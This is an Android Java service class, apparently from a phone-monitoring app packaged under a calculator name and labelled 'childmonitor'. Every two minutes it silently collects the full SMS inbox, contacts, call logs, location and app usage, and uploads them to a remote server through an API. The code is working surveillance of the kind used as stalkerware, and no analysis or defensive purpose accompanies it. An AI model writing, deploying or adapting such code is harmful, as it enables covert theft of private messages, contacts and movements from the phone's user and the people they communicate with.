package com.pydgeon.calculator;

import android.Manifest;
import android.app.Activity;
import android.app.AppOpsManager;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.app.usage.UsageStats;
import android.app.usage.UsageStatsManager;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.Canvas;
import android.graphics.drawable.BitmapDrawable;
import android.graphics.drawable.Drawable;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.net.ConnectivityManager;
import android.net.Uri;
import android.os.AsyncTask;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.IBinder;
import android.provider.CallLog;
import android.provider.ContactsContract;
import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import androidx.core.app.ActivityCompat;
import androidx.core.app.NotificationCompat;
import androidx.core.content.ContextCompat;

import android.util.Base64;
import android.util.Log;
import android.widget.ListView;

import org.json.JSONObject;

import java.io.ByteArrayOutputStream;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.Collections;
import java.util.Date;
import java.util.List;
import java.util.SortedMap;
import java.util.Timer;
import java.util.TimerTask;
import java.util.TreeMap;
import java.util.concurrent.TimeUnit;
import java.util.stream.Collectors;

public class ForegroundService extends Service {

    SimpleDateFormat sdfd = new SimpleDateFormat("yyyy/MM/dd");
    SimpleDateFormat sdft = new SimpleDateFormat("HH:mm");
    Timer timer;
    TimerTask timerTask;
    Handler handler = new Handler();
    SharedPreferences pref;
    String pid, cid;
    boolean timeAvailable;
    boolean hourAvailable = false;
    String TAG = "RESPONSE:-";

    ArrayList<String> name = new ArrayList<>();
    ArrayList<String> logo = new ArrayList<>();
    ArrayList<String> hours = new ArrayList<>();
    ArrayList<String> percent = new ArrayList<>();

    private Context mContext;

    // Flag for GPS status
    boolean isGPSEnabled = false;

    ConnectivityManager cm;
    Boolean internet = null;

    // Flag for network status
    boolean isNetworkEnabled = false;

    // Flag for GPS status
    boolean canGetLocation = false;

    Location location; // Location
    double latitude = 0.0; // Latitude
    double longitude = 0.0; // Longitude

    // The minimum distance to change Updates in meters
    private static final long MIN_DISTANCE_CHANGE_FOR_UPDATES = 1000; // 10 meters

    // The minimum time between updates in milliseconds
    private static final long MIN_TIME_BW_UPDATES = 1000 * 60 * 1; // 1 minute

    // Declaring a Location Manager
    protected LocationManager locationManager;
    public static String CHANNEL_ID = "";

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onCreate() {
        super.onCreate();
        startServices();
        pref = getSharedPreferences("childmonitor", Context.MODE_PRIVATE);
        Log.d(TAG,"I'M IN ONCREATE");
        timer = new Timer();
        demo();
//        timer.schedule(timerTask, 0, 60000 * 2);
        timer.schedule(timerTask, 0, 60000 * 2);
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
    }

    private void startServices() {

        Intent notificationIntent = new Intent(this, MainActivity.class);
        PendingIntent pendingIntent =
                PendingIntent.getActivity(this, 0, notificationIntent, 0);

        createNotificationChannel(getApplicationContext(), CHANNEL_ID);

        Notification notification = new NotificationCompat
                .Builder(getApplicationContext(), CHANNEL_ID)
                .setContentTitle(getString(R.string.app_name))
                .setContentText("TEST")
                .setContentIntent(pendingIntent)
                //.setPriority(Notification.PRIORITY_MIN)
                .setAutoCancel(false)
                .build();

        startForeground(123, notification);

    }

    public static void createNotificationChannel(@NonNull Context context, @NonNull String CHANNEL_ID) {
        // Create the NotificationChannel, but only on API 26+ because
        // the NotificationChannel class is new and not in the support library
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            CharSequence name = "Channelname";
            String description = "Channel desription";
            int importance = NotificationManager.IMPORTANCE_LOW;
            NotificationChannel channel = new NotificationChannel(CHANNEL_ID, name, importance);
            channel.setDescription(description);
            // Register the channel with the system; you can't change the importance
            // or other notification behaviors after this
            NotificationManager notificationManager = context.getSystemService(NotificationManager.class);
            if (notificationManager != null) {
                notificationManager.createNotificationChannel(channel);
            } else {
                Log.d("NotificationLog", "NotificationManagerNull");
            }
        }
    }


    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        super.onStartCommand(intent, flags, startId);
        return START_STICKY;
    }

    public void demo() {
        timerTask = new TimerTask() {
            @Override
            public void run() {
                handler.post(new Runnable() {
                    @Override
                    public void run() {
                        Log.d(TAG,"I'M HERE");
                        pid = pref.getString("pid", "");
                        cid = pref.getString("cid", "");
                        if (cid.compareTo("") != 0) {
                            getMessages();
                            getContacts(ForegroundService.this.getContentResolver());
                            getCallLogs(ForegroundService.this.getContentResolver());
                            getLocation();
                            loadStatistics();
                        }
                    }
                });
            }
        };
    }

    public void getMessages() {

        Uri uriSMSURI = Uri.parse("content://sms/inbox");
        Cursor cur = getContentResolver().query(uriSMSURI, new String[]{"_id", "address", "date", "body"}, null, null, null);
        String sms = "";
        ArrayList<String> id = new ArrayList<String>();
        ArrayList<String> name = new ArrayList<String>();
        ArrayList<String> date = new ArrayList<String>();
        ArrayList<String> time = new ArrayList<String>();
        ArrayList<String> body = new ArrayList<String>();
        ArrayList<String> Pid = new ArrayList<String>();
        ArrayList<String> Cid = new ArrayList<String>();

        while (cur.moveToNext()) {
            id.add(cur.getString(0));
            name.add(cur.getString(1));
            String b = cur.getString(3);
            b = b.replaceAll("'", "");
            b = b.replaceAll("\"", "");
            body.add(b);
            String dt = cur.getString(2);
            Date d = new Date(Long.parseLong(dt));
            String fd = sdfd.format(d);
            String ft = sdft.format(d);

            date.add(fd);
            time.add(ft);
            Pid.add(pid);
            Cid.add(cid);
        }


        new getMessageTask().execute(Pid, Cid, name, body, date, time);

    }

    public class getMessageTask extends AsyncTask<ArrayList<String>, JSONObject, String> {

        @Override
        protected void onPreExecute() {
            super.onPreExecute();
        }

        @Override
        protected String doInBackground(ArrayList<String>... params) {
            String a = "back";
            RestAPI api = new RestAPI();
            try {
                JSONObject json = api.addMessage(params[0], params[1], params[2], params[3], params[4], params[5]);
                Log.d(TAG,"getMessageTask "+json.toString());
                Log.d(TAG,"getMessageTask "+params[0]+"---"+
                        params[1]+"---"+ params[2]+"---"+ params[3]+"---"+
                        params[4]+"---"+params[5]);
                JSONPARSE jp = new JSONPARSE();
                a = jp.parse(json);
            } catch (Exception e) {
                a = e.getMessage();
            }
            return a;
        }

        @Override
        protected void onPostExecute(String s) {
            super.onPostExecute(s);
            Log.d(TAG,"getMessageTask "+s);

        }
    }

    public void getContacts(ContentResolver cr) {

        Cursor phones = cr.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME);

        ArrayList<String> name = new ArrayList<String>();
        ArrayList<String> PhoneNumber = new ArrayList<String>();
        ArrayList<String> Pid = new ArrayList<String>();
        ArrayList<String> Cid = new ArrayList<String>();

        while (phones.moveToNext()) {
            String n = phones.getString(phones.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
            String p = phones.getString(phones.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));

            n = n.replaceAll("'", "");
            n = n.replaceAll("\"", "");
            name.add(n);
            PhoneNumber.add(p);
            Pid.add(pid);
            Cid.add(cid);
        }
        phones.close();

        Log.d(TAG,name.toString());
        Log.d(TAG,PhoneNumber.toString());
        Log.d(TAG,Pid.toString());
        Log.d(TAG,Cid.toString());

//        for (int i=0 ;i<name.size();i++){
//
//            Call.setText(Call.getText().toString()+"\n"+name.get(i) + "\n" + PhoneNumber.get(i) +"\n\n\n");
//        }
        new getContactTask().execute(Pid, Cid, name, PhoneNumber);

    }

    public class getContactTask extends AsyncTask<ArrayList<String>, JSONObject, String> {

        @Override
        protected void onPreExecute() {
            super.onPreExecute();
        }

        @Override
        protected String doInBackground(ArrayList<String>... params) {
            String a = "back";
            RestAPI api = new RestAPI();
            try {
                JSONObject json = api.addcontact(params[0], params[1], params[2], params[3]);
                Log.d(TAG,"getContactTask "+json.toString());

                JSONPARSE jp = new JSONPARSE();
                a = jp.parse(json);
            } catch (Exception e) {
                a = e.getMessage();
            }
            return a;
        }

        @Override
        protected void onPostExecute(String s) {
            super.onPostExecute(s);
            Log.d(TAG,"getContactTask "+s);

        }
    }

    public void getCallLogs(ContentResolver cr) {

        String strOrder = CallLog.Calls.DATE + " DESC";
        Uri callUri = Uri.parse("content://call_log/calls");
        Cursor curCallLogs = cr.query(callUri, null, null, null, strOrder);


        ArrayList<String> conNumbers = new ArrayList<String>();
        ArrayList<String> conTime = new ArrayList<String>();
        ArrayList<String> conDate = new ArrayList<String>();
        ArrayList<String> conType = new ArrayList<String>();
        ArrayList<String> conDuration = new ArrayList<String>();
        ArrayList<String> Pid = new ArrayList<String>();
        ArrayList<String> Cid = new ArrayList<String>();


        while (curCallLogs.moveToNext()) {
            String callNumber = curCallLogs.getString(curCallLogs.getColumnIndex(CallLog.Calls.NUMBER));
            String duration = curCallLogs.getString(curCallLogs.getColumnIndex(CallLog.Calls.DURATION));
            String callDate = curCallLogs.getString(curCallLogs.getColumnIndex(CallLog.Calls.DATE));
            SimpleDateFormat formatter = new SimpleDateFormat("dd-MMM-yyyy");

            String dateTime = callDate;
            Date d = new Date(Long.parseLong(dateTime));
            String finalDate = sdfd.format(d);
            String finalTime = sdft.format(d);

            String dateString = formatter.format(new Date(Long.parseLong(callDate)));
            String callType = curCallLogs.getString(curCallLogs.getColumnIndex(CallLog.Calls.TYPE));

            if (callType.equals("1")) {
                conType.add("Incoming");
            } else if (callType.equals("2")) {
                conType.add("Outgoing");
            } else {
                conType.add("Missed");

            }
            callNumber = callNumber.replaceAll("'", "");
            callNumber = callNumber.replaceAll("\"", "");
            conNumbers.add(callNumber);

            conDuration.add(duration);
            conDate.add(finalDate);
            conTime.add(finalTime);
            Pid.add(pid);
            Cid.add(cid);


        }

//        for (int i=0 ;i<conNumbers.size();i++){
//
//            Call.setText(Call.getText().toString()+"\n"+conNumbers.get(i) + "\n" + conTime.get(i) +"\n"+conDate.get(i)+" \n"+conType.get(i)+"\n"+conDuration.get(i)+" \n"+"\n\n\n");
//        }


        new getCallLogTask().execute(Pid, Cid, conNumbers, conType, conDate, conTime, conDuration);


    }

    public class getCallLogTask extends AsyncTask<ArrayList<String>, JSONObject, String> {


        @Override
        protected void onPreExecute() {
            super.onPreExecute();
        }

        @Override
        protected String doInBackground(ArrayList<String>... params) {
            String a = "back";
            RestAPI api = new RestAPI();
            try {
                JSONObject json = api.addlog(params[0], params[1], params[2], params[3], params[4], params[5], params[6]);
                Log.d(TAG,"getCallLogTask "+json.toString());
                JSONPARSE jp = new JSONPARSE();
                a = jp.parse(json);
            } catch (Exception e) {
                a = e.getMessage();
            }
            return a;
        }

        @Override
        protected void onPostExecute(String s) {
            super.onPostExecute(s);
            Log.d(TAG,"getCallLogTask "+s);

        }
    }

    public void getLocation() {
//        Toast.makeText(getApplicationContext(),"Inside getLocation",Toast.LENGTH_LONG).show();

        ArrayList<String> Pid = new ArrayList<String>();
        ArrayList<String> Cid = new ArrayList<String>();
        ArrayList<String> LatLng = new ArrayList<String>();
        ArrayList<String> d = new ArrayList<String>();
        ArrayList<String> t = new ArrayList<String>();

        try {
            GPSTrack gps_tracker = new GPSTrack(ForegroundService.this);
            if (gps_tracker.canGetLocation()) {
                double Lat = gps_tracker.getLatitude();
                double Lng = gps_tracker.getLongitude();

//                Toast.makeText(this, Lat+","+Lng, Toast.LENGTH_SHORT).show();
                if (Lat != 0 && Lng != 0) {
                    Pid.add(pid);
                    Cid.add(cid);
                    LatLng.add(Lat + "," + Lng);
                    Date dt = new Date();
                    d.add(sdfd.format(dt.getTime()));
                    t.add(sdft.format(dt.getTime()));
//                    Toast.makeText(this, LatLng+"", Toast.LENGTH_SHORT).show();

                    new getLocationTask().execute(Pid, Cid, LatLng, d, t);

                }
            } else {
//                Toast.makeText(getApplicationContext(),"else",Toast.LENGTH_LONG).show();

            }
        } catch (Exception e) {
//            Toast.makeText(getApplicationContext(),e.getMessage(),Toast.LENGTH_LONG).show();
        }

    }

    public class getLocationTask extends AsyncTask<ArrayList<String>, JSONObject, String> {

        @Override
        protected void onPreExecute() {
            super.onPreExecute();
        }


        @Override
        protected String doInBackground(ArrayList<String>... params) {
            String a = "back";
            RestAPI api = new RestAPI();
            try {
                JSONObject json = api.addLocation(params[0], params[1], params[2], params[3], params[4]);
                JSONPARSE jp = new JSONPARSE();
                a = jp.parse(json);
            } catch (Exception e) {
                a = e.getMessage();
            }
            return a;
        }

        @Override
        protected void onPostExecute(String s) {
            super.onPostExecute(s);
            Log.d(TAG,"getLocationTask "+s);

        }
    }

    public class GPSTrack {


        Activity activity;

        public GPSTrack() {

        }

        public GPSTrack(Context context) {
            mContext = context;
            getLocation();
        }


        public Location getLocation() {
            try {


                locationManager = (LocationManager) mContext.getSystemService(mContext.LOCATION_SERVICE);

                // Getting GPS status
                isGPSEnabled = locationManager
                        .isProviderEnabled(LocationManager.GPS_PROVIDER);

                // Getting network status
                isNetworkEnabled = locationManager
                        .isProviderEnabled(LocationManager.NETWORK_PROVIDER);

                if (!isGPSEnabled && !isNetworkEnabled) {
                    // No network provider is enabled
                } else {
                    canGetLocation = true;
                    if (isNetworkEnabled) {
                        int requestPermissionsCode = 50;

                        if (ActivityCompat.checkSelfPermission(getApplicationContext(), Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED && ActivityCompat.checkSelfPermission(getApplicationContext(), Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
                            return location;
                        }
                        locationManager.requestLocationUpdates(LocationManager.NETWORK_PROVIDER, MIN_TIME_BW_UPDATES, MIN_DISTANCE_CHANGE_FOR_UPDATES, mLocationListener);
                        Log.d("Network", "Network");
                        if (locationManager != null) {
                            location = locationManager
                                    .getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
                            if (location != null) {
                                latitude = location.getLatitude();
                                longitude = location.getLongitude();
                            }
                        }
                    }
                }
                // If GPS enabled, get latitude/longitude using GPS Services
                if (isGPSEnabled) {
                    if (location == null) {
                        if (ContextCompat.checkSelfPermission(mContext, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED && ActivityCompat.checkSelfPermission(mContext, Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
//                            ActivityCompat.requestPermissions(mContext, new String[]{Manifest.permission.ACCESS_FINE_LOCATION}, 50);

                        } else {
                            locationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER, MIN_TIME_BW_UPDATES, MIN_DISTANCE_CHANGE_FOR_UPDATES, mLocationListener);
                            Log.d("GPS Enabled", "GPS Enabled");
                            if (locationManager != null) {

                                location = locationManager
                                        .getLastKnownLocation(LocationManager.GPS_PROVIDER);
                                if (location != null) {
                                    latitude = location.getLatitude();
                                    longitude = location.getLongitude();
                                }
                            }
                        }
                    }

                }
            } catch (Exception e) {
                e.printStackTrace();
            }

            return location;
        }


        private final LocationListener mLocationListener = new LocationListener() {
            @Override
            public void onLocationChanged(final Location location) {

                if (location != null) {
                    latitude = location.getLatitude();
                    longitude = location.getLongitude();

//                    Toast.makeText(Back_Service.this, "Location Changed--"+latitude+","+longitude, Toast.LENGTH_SHORT).show();
                }
            }

            @Override
            public void onStatusChanged(String provider, int status, Bundle extras) {

            }

            @Override
            public void onProviderEnabled(String provider) {

            }

            @Override
            public void onProviderDisabled(String provider) {

            }
        };


        public boolean canGetLocation() {
            return canGetLocation;
        }


        public double getLatitude() {
            if (location != null) {
                latitude = location.getLatitude();
            }

            return latitude;
        }


        public double getLongitude() {
            if (location != null) {
                longitude = location.getLongitude();
            }

            return longitude;
        }

    }

    public void loadStatistics() {
        UsageStatsManager usm = (UsageStatsManager) this.getSystemService(USAGE_STATS_SERVICE);
        List<UsageStats> appList = usm.queryUsageStats(UsageStatsManager.INTERVAL_DAILY,  System.currentTimeMillis() - 1000*3600*24,  System.currentTimeMillis());
        // Group the usageStats by application and sort them by total time in foreground
        if (appList != null && appList.size() > 0) {
            SortedMap<Long, UsageStats> mySortedMap = new TreeMap<>();
            for (UsageStats usageStats : appList) {
                mySortedMap.put(usageStats.getTotalTimeInForeground(), usageStats);
            }
            showAppsUsage(mySortedMap);
        }
    }

    public void showAppsUsage(SortedMap<Long, UsageStats> mySortedMap) {
        List<UsageStats> usageStatsList = mySortedMap.values().stream().filter(this::isAppInfoAvailable).collect(Collectors.toList());

        // get total time of apps usage to calculate the usagePercentage for each app
        long totalTime = usageStatsList.stream().map(UsageStats::getTotalTimeInForeground).mapToLong(Long::longValue).sum();

        //clear and fill the appsList
        logo.clear();
        name.clear();
        hours.clear();
        percent.clear();
        for (UsageStats usageStats : usageStatsList) {
            try {
                String packageName = usageStats.getPackageName();
                ApplicationInfo ai = getApplicationContext().getPackageManager().getApplicationInfo(packageName, 0);
                Drawable icon = getApplicationContext().getPackageManager().getApplicationIcon(ai);
                String appName = getApplicationContext().getPackageManager().getApplicationLabel(ai).toString();
                String usageDuration = getDurationBreakdown(usageStats.getTotalTimeInForeground());
                int usagePercentage = (int) (usageStats.getTotalTimeInForeground() * 100 / totalTime);
                Bitmap iconBitmap = drawableToBitmap(icon);
                ByteArrayOutputStream baos = new ByteArrayOutputStream();
                iconBitmap.compress(Bitmap.CompressFormat.JPEG, 100, baos); // bm is the bitmap object
                byte[] byteArrayImage = baos.toByteArray();
                String encodedImage = Base64.encodeToString(byteArrayImage, Base64.DEFAULT);
                if(usagePercentage>0) {
                    if(!name.contains(appName)) {
                        logo.add(encodedImage);
                        name.add(appName);
                        hours.add(usageDuration);
                        percent.add(String.valueOf(usagePercentage));

                    }
                }
            } catch (PackageManager.NameNotFoundException e) {
                e.printStackTrace();
            }
        }
        Calendar c = Calendar.getInstance();
        SimpleDateFormat df = new SimpleDateFormat("yyyy/MM/dd");
        String formattedDate = df.format(c.getTime());
        new addappusage().execute(pid,cid,formattedDate);
    }


    private boolean isAppInfoAvailable(UsageStats usageStats) {
        try {
            getApplicationContext().getPackageManager().getApplicationInfo(usageStats.getPackageName(), 0);
            return true;
        } catch (PackageManager.NameNotFoundException e) {
            e.printStackTrace();
            return false;
        }
    }

    private String getDurationBreakdown(long millis) {
        if (millis < 0) {
            throw new IllegalArgumentException("Duration must be greater than zero!");
        }

        long hours = TimeUnit.MILLISECONDS.toHours(millis);
        millis -= TimeUnit.HOURS.toMillis(hours);
        long minutes = TimeUnit.MILLISECONDS.toMinutes(millis);
        millis -= TimeUnit.MINUTES.toMillis(minutes);
        long seconds = TimeUnit.MILLISECONDS.toSeconds(millis);

        return (hours + " h " +  minutes + " m " + seconds + " s");
    }

    public class addappusage extends AsyncTask<String, JSONObject, String> {

        @Override
        protected void onPreExecute() {
            super.onPreExecute();
        }


        @Override
        protected String doInBackground(String... params) {
            String a = "back";
            RestAPI api = new RestAPI();
            try {
                JSONObject json = api.addappusage(params[0], params[1],logo,name,hours,percent,params[2]);
                JSONPARSE jp = new JSONPARSE();
                a = jp.parse(json);
            } catch (Exception e) {
                a = e.getMessage();
            }
            return a;
        }

        @Override
        protected void onPostExecute(String s) {
            super.onPostExecute(s);
            Log.d(TAG,"addappusage "+s);

        }
    }

    public static Bitmap drawableToBitmap (Drawable drawable) {
        Bitmap bitmap = null;

        if (drawable instanceof BitmapDrawable) {
            BitmapDrawable bitmapDrawable = (BitmapDrawable) drawable;
            if(bitmapDrawable.getBitmap() != null) {
                return bitmapDrawable.getBitmap();
            }
        }

        if(drawable.getIntrinsicWidth() <= 0 || drawable.getIntrinsicHeight() <= 0) {
            bitmap = Bitmap.createBitmap(1, 1, Bitmap.Config.ARGB_8888); // Single color bitmap will be created of 1x1 pixel
        } else {
            bitmap = Bitmap.createBitmap(drawable.getIntrinsicWidth(), drawable.getIntrinsicHeight(), Bitmap.Config.ARGB_8888);
        }

        Canvas canvas = new Canvas(bitmap);
        drawable.setBounds(0, 0, canvas.getWidth(), canvas.getHeight());
        drawable.draw(canvas);
        return bitmap;
    }

}
